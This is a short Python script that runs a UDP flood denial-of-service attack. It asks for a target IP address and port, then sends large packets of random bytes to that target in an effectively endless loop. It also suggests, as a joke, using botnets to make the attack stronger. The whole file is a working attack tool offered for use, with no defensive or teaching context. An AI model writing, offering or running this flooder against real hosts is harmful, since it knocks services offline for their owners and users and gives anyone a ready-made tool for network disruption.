import socket, random, time
 
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("Use botnets for better results >:)")
ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

print("sending koalas into the network")
for i in range(1, 100**1000):
    s.send(random._urandom(10)*1000)
    print(f"Koalas sent: {i}", end='\r')
    time.sleep(sleep)
